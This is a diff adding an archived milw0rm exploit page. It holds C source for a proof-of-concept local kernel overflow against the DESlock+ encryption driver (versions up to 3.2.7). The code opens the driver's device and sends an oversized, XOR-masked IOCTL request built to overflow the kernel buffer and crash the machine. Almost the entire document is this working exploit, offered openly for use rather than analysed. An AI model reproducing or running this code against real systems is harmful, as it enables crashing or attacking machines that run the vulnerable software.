@@ -1,0 +1,111 @@
+From: <ÓÉ Windows Internet Explorer 7 ±£´æ>
+Subject: DESlock+ <= 3.2.7 Local Kernel Overflow PoC
+Date: Sat, 27 Mar 2010 23:04:52 +0800
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Location: http://milw0rm.com/exploits/6496
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.5579
+
+=EF=BB=BF<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>DESlock+ <=3D 3.2.7 Local Kernel Overflow PoC</TITLE>
+<META http-equiv=3DContent-Type content=3D"text/html; charset=3Dutf-8">
+<META content=3D"MSHTML 6.00.6000.16981" name=3DGENERATOR></HEAD>
+<BODY><PRE>/* deslock-overflow.c
+ *
+ * Copyright (c) 2008 by &lt;mu-b@digit-labs.org&gt;
+ *
+ * DESlock+ &lt;=3D 3.2.7 local kernel overflow POC
+ * by mu-b - Sat 23 Feb 2008
+ *
+ * - Tested on: DLMFENC.sys 1.0.0.28
+ *
+ * =
+http://www.cctmark.gov.uk/CCTMAwards/DataEncryptionSystemsLtd/tabid/103/D=
+efault.aspx
+ * - I wonder what that says about CESG CCTM?
+ *
+ *    - Private Source Code -DO NOT DISTRIBUTE -
+ * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+#include &lt;windows.h&gt;
+
+#define DLMFENC_IOCTL   0x0FA4204C
+#define DLMFENC_FLAG    0xC001D00D
+#define DLMFENC_BUZ_SZ  0x1000
+
+#define ARG_SIZE(a)     ((a-(sizeof (int)*2))/sizeof (void *))
+
+struct ioctl_req {
+  int flag;
+  int req_num;
+  void *arg[ARG_SIZE(0x20)];
+};
+
+static void
+xor_mask_req (struct ioctl_req *req)
+{
+  DWORD i, pid;
+  PCHAR ptr;
+
+  pid =3D GetCurrentProcessId ();
+  for (i =3D 0, ptr =3D (PCHAR) req; i &lt; 0x0C; i++, ptr++)
+    *ptr ^=3D pid;
+}
+
+int
+main (int argc, char **argv)
+{
+  struct ioctl_req req;
+  CHAR buf[DLMFENC_BUZ_SZ + 128];
+  HANDLE hFile;
+  BOOL result;
+  DWORD rlen;
+
+  printf ("DESlock+ &lt;=3D 3.2.7 local kernel overflow PoC\n"
+          "by: &lt;mu-b@digit-labs.org&gt;\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");
+
+  fflush (stdout);
+  hFile =3D CreateFileA ("\\\\.\\DLKPFSD_Device", FILE_EXECUTE,
+                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
+                       OPEN_EXISTING, 0, NULL);
+  if (hFile =3D=3D INVALID_HANDLE_VALUE)
+    {
+      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
+      exit (EXIT_FAILURE);
+    }
+
+  buf[0] =3D 'C';                           /* drive letter */
+  memset (&amp;buf[1], 0x41, sizeof buf - 1); /* filename     */
+  buf[sizeof buf - 1] =3D '\0';
+
+  memset (&amp;req, 0, sizeof req);
+  req.flag =3D DLMFENC_FLAG;
+  req.req_num =3D 0x05;
+  req.arg[0] =3D (void *) buf;
+  sleep (2000);
+
+  xor_mask_req (&amp;req);
+  result =3D DeviceIoControl (hFile, DLMFENC_IOCTL,
+                            &amp;req, sizeof req, &amp;req, sizeof req, =
+&amp;rlen, 0);
+  if (!result)
+    {
+      fprintf (stderr, "* DeviceIoControl failed\n");
+      exit (EXIT_FAILURE);
+    }
+
+  printf ("* hmmm, you didn't STOP the box?!?! rlen: %d\n", rlen);
+
+  CloseHandle (hFile);
+
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2008-09-20]</PRE></BODY></HTML>
